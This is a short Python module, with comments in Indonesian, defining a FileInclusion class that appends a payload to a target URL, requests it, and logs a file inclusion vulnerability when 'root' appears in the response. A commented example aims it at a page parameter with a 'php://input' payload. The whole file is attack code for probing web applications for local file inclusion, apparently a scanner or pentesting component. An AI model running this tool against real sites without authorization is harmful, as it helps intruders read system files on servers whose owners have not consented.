import requests
import logging

logger = logging.getLogger(__name__)

class FileInclusion:
    def __init__(self, target_url):
        self.target_url = target_url

    def exploit(self, payload):
        """
        Mencoba eksploitasi file inclusion dengan memasukkan file berbahaya.
        """
        try:
            response = requests.get(self.target_url + payload)
            if "root" in response.text.lower():  # Misalnya, memeriksa hasil yang mengandung "root"
                logger.info(f"File inclusion vulnerability found at {self.target_url}")
            else:
                logger.info("No file inclusion detected.")
        except Exception as e:
            logger.error(f"Error during file inclusion attack: {str(e)}")

# Contoh penggunaan:
# file_inclusion = FileInclusion("http://example.com/index.php?page=")
# file_inclusion.exploit("php://input")
